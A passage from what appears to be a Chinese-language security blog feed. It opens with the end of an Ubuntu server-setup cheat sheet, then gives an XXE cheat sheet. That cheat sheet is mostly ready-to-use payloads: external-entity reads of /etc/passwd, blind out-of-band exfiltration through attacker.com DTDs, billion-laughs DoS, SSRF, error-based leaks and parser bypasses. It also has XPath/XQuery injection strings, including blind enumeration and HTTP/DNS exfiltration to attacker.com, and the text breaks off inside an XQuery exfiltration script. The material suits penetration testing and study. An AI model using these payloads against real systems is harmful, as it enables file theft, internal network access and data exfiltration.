title="Redis"></a>Redis</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y redis</span><br></pre></td></tr></table></figure><h2 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y sqlite3</span><br></pre></td></tr></table></figure><h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y postgresql</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Shell commands for web server environment configuration in Ubuntu, quickly build a web server environment.</summary>
    
    
    
    <category term="CheatSheet" scheme="https://srpopty.github.io/categories/CheatSheet/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>XXE CheatSheet</title>
    <link href="https://srpopty.github.io/2022/05/04/XXE-CheatSheet/"/>
    <id>https://srpopty.github.io/2022/05/04/XXE-CheatSheet/</id>
    <published>2022-05-04T09:01:54.000Z</published>
    <updated>2022-05-04T09:01:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="# 简介" class="headerlink" title="简介"></a>简介</h1><p>XXE(XML External Entity, XML 外部实体)，在一个 XML 文档中，攻击者可以直接控制 DTD 中 XML 实体的定义，引用外部实体，导致 SSRF。</p><p>使用 XML 的地方有：</p><ul><li>文档格式 OOXML, ODF, PDF, RSS, DOCX…</li><li>图片格式 SVG, EXIF Headers…</li><li>配置文件</li><li>网络协议 WebDAV, CalDAV, XMLRPC, SOAP, REST, XMPP, SAML, XACML…</li></ul><p>XXE 特征：</p><ul><li>PHP: <code>simplexml_load_file</code>, <code>xml_parse</code>, <code>simplexml_load_string</code></li><li>Java: <code>DOM</code>, <code>SAX</code>, <code>JDOM</code>, <code>DOM4J</code></li><li>Python: <code>SAX</code>, <code>DOM</code>, <code>ElementTree</code></li></ul><blockquote><p>在某些 xml 解析器中，尽管禁用了外部实体，但是解析器会在 DTD 定义阶段就对 URL 进行请求，但是不会展开该实体。<br>libxml2.9.0 后默认不解析外部实体。<br>simplexml_load_file 旧版本默认解析外部实体，新版本要指定第三個参数 LIBXML_NOENT</p></blockquote><p>XXE 有以下几种利用方法（以文件读取为例）。</p><h2 id="普通实体"><a href="# 普通实体" class="headerlink" title="普通实体"></a>普通实体 </h2><p> 引用外部普通实体。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT b (<span class="keyword">#CDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="symbol">&amp;c;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：元素类型主要有 PCDATA 和 CDATA 两种，PCDATA 中的文本会被当成 XML 解析，CDATA 中的文本则不会。定义 b 为 CDATA 来避免 &amp;c; 中出现特殊字符导致 XML 解析器解析失败而报错。<br>XML 中有 5 个预定义的实体：&amp;lt;，&amp;gt;，&amp;amp;，&amp;apos; 和 &amp;quot;，分别替换 &lt; &gt; &amp; ‘和”。字符实体也可以直接通过 Ascii 码使用，例如 % 的实体为 &amp;#x25;。</p></blockquote><p>当要读取的文件中存在一些复杂的字符（例如<code>/etc/fstab</code>），可能会引起 xml 解析器报错时，可以使用参数实体拼接绕过，如下所示。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">goodies</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/fstab&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">all</span> <span class="string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参数实体外部 DTD"><a href="# 参数实体外部 DTD" class="headerlink" title="参数实体外部 DTD"></a>参数实体外部 DTD</h2><p>利用参数实体引用外部 DTD 文件。</p><blockquote><p>注意：参数实体只能在 DTD 中引用，不能在声明前引用，也不能在实体声明内部引用。</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT b (<span class="keyword">#CDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % c <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %c;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="symbol">&amp;d;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 的内容如下。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY d <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="普通实体外部 DTD"><a href="# 普通实体外部 DTD" class="headerlink" title="普通实体外部 DTD"></a>普通实体外部 DTD</h2><p>通过普通实体引用外部 DTD 文件。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT b (<span class="keyword">#CDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="symbol">&amp;d;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 的内容如下。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY d <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h2><p>通过定义数量巨大的实体可以造成 DOS 攻击。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT a (<span class="keyword">#ANY</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY a0 <span class="string">&quot;dos&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">a1</span> <span class="string">&quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">a2</span> <span class="string">&quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;a2;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>a2 会被扩展为很多 a1，每个 a1 又会被扩展为很多 a0，这样的嵌套扩展会严重拖慢 XML 解析器的速度。</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>外部实体引用可以访问一个 URL，造成 SSRF，通过 SSRF 可以读取文件，攻击内网等。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT a (<span class="keyword">#ANY</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b <span class="keyword">SYSTEM</span> <span class="string">&quot;http://a.com/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XXE 盲注"><a href="#XXE 盲注" class="headerlink" title="XXE 盲注"></a>XXE 盲注 </h2><p> 无回显的情况下可以将数据通过 HTTP 发送到远程服务器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">    %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 的内容如下。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY &amp;#x25; <span class="keyword">payload</span> <span class="string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://attacker.com/?data=%file;&#x27;&gt;&quot;</span>&gt;</span> </span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><blockquote><p>注意要将 % 实体编码为 &amp;#x25;</p></blockquote><p>攻击流程：</p><ol><li>首先展开<code>%remote;</code>，请求远程服务器中的<code>evil.dtd</code>。</li><li>展开 <code>evil.dtd</code> 中的<code>%payload;</code>。</li><li>展开 <code>evil.dtd</code> 中的<code>%send;</code>。</li><li>展开 <code>%send;</code> 中的<code>%file;</code>，读取文件。</li><li>最后调用 <code>%send;</code>，将展开的<code>%file;</code> 发送到远程服务器中。</li></ol><blockquote><p>在 PHP 环境下可以将数据通过 base64 编码（利用 filter）通过 url 发送到远程服务器以避免 url 坏字符。</p></blockquote><h2 id="报错注入"><a href="# 报错注入" class="headerlink" title="报错注入"></a>报错注入 </h2><p> 类似 SQL 注入的报错注入，XXE 也可以通过报错注入返回一些额外信息，如下所示。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">message</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">NUMBER</span> <span class="string">&#x27;&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %NUMBER;</span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>a<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以下 Payload 可能也会引起 XML 解析器错误：</p><ul><li><code>&lt;!ENTITY % trick &quot;&lt;!ENTITY err SYSTEM &#39;file:///some&#39;%pay; gif&gt;&quot;&gt; %trick;</code></li><li><code>&lt;!ENTITY % trick &quot;&lt;!ENTITY :%pay;&gt;&quot;&gt; %trick;</code></li><li><code>&lt;!ENTITY % trick &quot;&lt;!ENTITY &amp;#37; err SYSTEM &#39;%pay;&#39;&gt;&quot;&gt; %trick; %err;</code></li><li><code>&lt;!ENTITY % trick &quot;&lt;!ENTITY :%pay;&gt;&quot;&gt; %trick;</code></li><li><code>&lt;!ENTITY % trick &quot;&lt;!ENTITY &amp;#37; err SYSTEM &#39;%pay;&#39;&gt;&quot;&gt; %trick; %err;</code></li><li><code>&lt;!ENTITY % trick &quot;&lt;!ENTITY &amp;#37; err SYSTEM &#39;http%pay;:/127.0.0.1/&#39;&gt;&quot;&gt; %trick; %err;</code></li><li><code>&lt;!DOCTYPE html [&lt;!ENTITY % foo SYSTEM &quot;file:///c:/boot.ini&quot;&gt; %foo;]&gt;</code></li></ul><h2 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://x.x.x.x:22/&quot;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="其他 Payload"><a href="# 其他 Payload" class="headerlink" title="其他 Payload"></a>其他 Payload</h1><h2 id="绕过"><a href="# 绕过" class="headerlink" title="绕过"></a>绕过</h2><ul><li>可以用 <code>PUBLIC</code> 代替 <code>SYSTEM</code>，二者完全等价。</li><li>修改文档编码格式，例如 <code>UTF-7</code>，<code>UTF-16</code>等。</li></ul><p>其他绕过方法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE :. <span class="keyword">SYTEM</span> <span class="string">&quot;http://&quot;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE :_-_: <span class="keyword">SYTEM</span> <span class="string">&quot;http://&quot;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE &#123;0xdfbf&#125; <span class="keyword">SYSTEM</span> <span class="string">&quot;http://&quot;</span></span></span><br></pre></td></tr></table></figure><h2 id="XML 注入"><a href="#XML 注入" class="headerlink" title="XML 注入"></a>XML 注入 </h2><p> 类似 XSS 中的闭合标签 / 引号。程序将用户输入直接拼接到一个 XML 文档中时，可以通过闭合标签 / 引号的方式注入新的 XML 数据，控制 XML 文档。</p><h2 id="XPath 注入"><a href="#XPath 注入" class="headerlink" title="XPath 注入"></a>XPath 注入</h2><p>SQL 语言是为了从 SQL 数据库中获取数据而产生的语言，同样为了从 XML 文档中获取数据，产生了 XPath 查询语言。类似 SQL 注入，程序将用户输入直接拼接到一个 XPath 查询语句中，造成 XPath 注入，可以获取 XML 文档的数据，甚至控制 XML 文档。</p><p>例如有一个查询语句 <code>/root/users/user[username/text()=&#39;attacker&#39; and password/text()=&#39;yyyy&#39;]</code>，若攻击者将<code>attacker</code> 替换为<code>&#39; or 1=1 or &#39;&#39;=&#39;</code>，那么查询语句就变成了<code>/root/users/user[username/text()=&#39;&#39; or 1=1 or &#39;&#39;=&#39;&#39; and password/text()=&#39;yyyy&#39;]</code>。该查询语句将一直返回 true，导致查询出所有的 user 信息，由于 XPath 不像 SQL 注入有很多访问控制，XPath 的注入没有太多的限制。</p><h3 id="盲注"><a href="# 盲注" class="headerlink" title="盲注"></a>盲注 </h3><h4 id="布尔盲注"><a href="# 布尔盲注" class="headerlink" title="布尔盲注"></a> 布尔盲注 </h4><p> 在无回显的情况下，XPath 也可以盲注。首先需要获取某个节点下子节点的数量。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or count(/*) = 1 or &#x27;1&#x27; = &#x27;2</span><br><span class="line">&#x27; or count(/*) = 2 or &#x27;1&#x27; = &#x27;2</span><br><span class="line">&#x27; or count(/*) = 3 or &#x27;1&#x27; = &#x27;2</span><br><span class="line">&#x27; or count(/*) = 4 or &#x27;1&#x27; = &#x27;2</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>之后爆破出该节点的名字。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or substring(name(/*[position() = 1]),1,1)=&#x27;a&#x27; or &#x27;1&#x27;=&#x27;2</span><br><span class="line">&#x27; or substring(name(/*[position() = 1]),1,1)=&#x27;b&#x27; or &#x27;1&#x27;=&#x27;2</span><br><span class="line">&#x27; or substring(name(/*[position() = 1]),1,1)=&#x27;c&#x27; or &#x27;1&#x27;=&#x27;2</span><br><span class="line">&#x27; or substring(name(/*[position() = 1]),1,1)=&#x27;d&#x27; or &#x27;1&#x27;=&#x27;2</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>利用同样的方法也可以爆破出节点的属性。</p><h4 id="HTTP 外带"><a href="#HTTP 外带" class="headerlink" title="HTTP 外带"></a>HTTP 外带 </h4><p> 在 XPath 2.0 中，提供一个 <code>doc</code> 函数，该函数可以从 web 服务器中请求一个 xml 文档，利用这个 HTTP 请求，可以将数据外带到 web 服务器中。下面的 payload 可以将根节点的名字外带到 web 服务器中。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or doc(concat(&quot;http://attacker.com/?data=&quot;, encode-foruri(/*[1]/name()))) or &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure><h4 id="DNS 外带"><a href="#DNS 外带" class="headerlink" title="DNS 外带"></a>DNS 外带 </h4><p> 同样可以利用 DNS 外带数据，下面的 payload 可以将根节点的名字外带到 DNS 服务器中。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or doc(concat(encode-foruri(/*[1]/name()), &#x27;.attacker.com&#x27;)) or &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure><h3 id="常用函数"><a href="# 常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><ul><li><code>count(/root/*)</code> 获取 <code>root</code> 节点下所有子节点的数量。</li><li><code>string-length(/*[1]/*[1]/name())</code> 获取第一个节点下第一个节点的名字的长度。</li><li><code>substring(/*[1]/*[1]/name(), 1, 1)</code> 截取第一个节点下第一个节点的名字的第一个字符。</li><li><code>lower-case(&quot;A&quot;) = &quot;a&quot;</code> 用于判断 XPath 版本，此函数在 2.0 中才加入。</li><li><code>base-uri()</code> 返回该 XML 文档文件的位置，XPath 2.0 加入。</li><li><code>/root/a/text()</code> 获取 root 节点下 a 节点的文本内容。</li><li><code>matches(/*[1]/name(), &#39;[A-Z]+&#39;)</code>  通过正则表达式验证。</li><li><code>string-to-codepoints(&quot;abc&quot;)</code> 将字符串转换为 Ascii 码(97, 98, 99)。</li><li><code>(if 1 then 1 else 0)</code> 条件表达式，可用于布尔盲注。</li><li><code>concat(&#39;a&#39;, &#39;b&#39;)</code> 字符串链接。</li><li><code>doc(‘http://attacker.com/a.xml’)</code> 从 web 服务器上读取一个 xml 文档，XPath 2.0 加入。此功能不是默认启用，并且 URI 若不是 xml 文档会报错。</li><li><code>encode-foruri(&#39;abc&#39;)</code> URL 编码，XPath 2.0 加入。</li></ul><h3 id="XPath 语法速查"><a href="#XPath 语法速查" class="headerlink" title="XPath 语法速查"></a>XPath 语法速查 </h3><p> 更多 XPath 知识，参考<a href="https://www.w3school.com.cn/xpath/index.asp">w3school</a>。</p><h4 id="节点类型"><a href="# 节点类型" class="headerlink" title="节点类型"></a>节点类型</h4><p>XPath 中将 XML 节点分为以下几种类型：</p><ul><li><code>element</code> 元素 / 节点</li><li><code>attribute</code> 属性</li><li><code>text</code> 文本</li><li><code>namespace</code> 命名空间</li><li><code>processing-instruction</code> 处理指令</li><li><code>comment</code> 注释</li><li><code>root</code> 根节点</li></ul><h4 id="表达式"><a href="# 表达式" class="headerlink" title="表达式"></a>表达式</h4><p>XPath 通过表达式选取 XML 节点，常用表达式如下：</p><ul><li><code>nodename</code> 选取此节点的所有子节点</li><li><code>/</code> 从根节点选取</li><li><code>//</code> 从匹配选择的当前节点选择文档中的节点，不考虑它们的位置</li><li><code>.</code> 选取当前节点</li><li><code>..</code> 选取当前节点的父节点</li><li><code>@</code> 选取属性</li></ul><p>例如：</p><ul><li><code>bookstore</code> 选取 bookstore 元素所有的子节点</li><li><code>/bookstore</code> 选取根节点 bookstore</li><li><code>bookstore/book</code> 选取 bookstore 节点下所有子节点中的 book 节点</li><li><code>//book</code> 选取所有的 book 节点，不论在文档中的位置在哪</li><li><code>bookstore//book</code> 选取 bookstore 节点中所有后代节点中的 book 节点</li><li><code>//@lang</code> 选取名为 lang 的所有属性</li></ul><h4 id="限定语"><a href="# 限定语" class="headerlink" title="限定语"></a>限定语 </h4><p> 通过限定语可以选取某个具体的节点，限定语跟在节点后，包裹在方括号中，例如：</p><ul><li><code>/bookstore/book[1]</code> 选取属于 bookstore 子节点中的第一个 book 节点</li><li><code>/bookstore/book[last()]</code> 选取属于 bookstore 子节点中的最后一个 book 节点</li><li><code>//title[@lang]</code> 选取所有拥有名为 lang 的属性的 title 节点</li><li><code>//title[@lang=&#39;eng&#39;]</code> 选取所有 title 节点，且这些节点拥有值为 eng 的 lang 属性</li><li><code>/bookstore/book[price&gt;3.500]/title</code> 选取 bookstore 节点中的 book 节点的所有 title 节点，且其中的 price 节点的值须大于 35.00</li></ul><h4 id="通配符"><a href="# 通配符" class="headerlink" title="通配符"></a>通配符</h4><p>XPath 支持部分通配符选择元素：</p><ul><li><code>*</code> 匹配任意节点</li><li><code>@*</code> 匹配任意属性节点</li></ul><p>例如：</p><ul><li><code>/bookstore/*</code> 选择 bookstore 节点下的所有子节点</li><li><code>//*</code> 选择文档中所有节点</li><li><code>//title[@*]</code> 选择所有带有属性的节点</li></ul><h4 id="多路径查询"><a href="# 多路径查询" class="headerlink" title="多路径查询"></a>多路径查询 </h4><p>XPath 支持使用<code>|</code> 进行多路径查询，例如：</p><ul><li><code>//book/title | //book/price</code> 选择 book 节点下的所有 title 和 price 节点</li><li><code>bookstore/book/title | //price</code> 选择属于 bookstore 节点的 book 节点下的所有 title 节点以及文档中所有 price 节点</li></ul><h2 id="XQuery 注入"><a href="#XQuery 注入" class="headerlink" title="XQuery 注入"></a>XQuery 注入 </h2><p>XQuery 是 XPath 的超集，XQuery 可以赋予 XPath 逻辑编程能力，例如下面的代码会遍历每一个从<code>users</code> 中查询出的节点，并且返回该节点下的 <code>username</code> 节点。</p><figure class="highlight xpath"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">$user</span> <span class="keyword">in</span> //users[@role=<span class="string">&#x27;admin&#x27;</span>] <span class="keyword">return</span> <span class="variable">$user</span>/username</span><br></pre></td></tr></table></figure><p>若上述查询中，<code>admin</code>字符串可控，那么就可以注入 XPath 查询甚至 XQuery 代码，下面的代码利用<code>doc</code>，循环便利整个 xml 文档，将所有整个文档发送到攻击者的服务器中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> $n <span class="keyword">in</span> /*[<span class="number">1</span>]/*</span><br><span class="line">    let $x := <span class="keyword">for</span> $att <span class="keyword">in</span> $n/@* <span class="keyword">return</span>(concat(name($att), <span class="string">&quot;=&quot;</span>, encode-<span class="keyword">for</span>-uri($att)))</span><br><span class="line">    let $y := doc(concat(</span><br><span class="line">        <span class="string">&quot;http://attacker.com/?name=&quot;</span>, encode-<span class="keyword">for</span>-uri(name($n)), </span><br><span 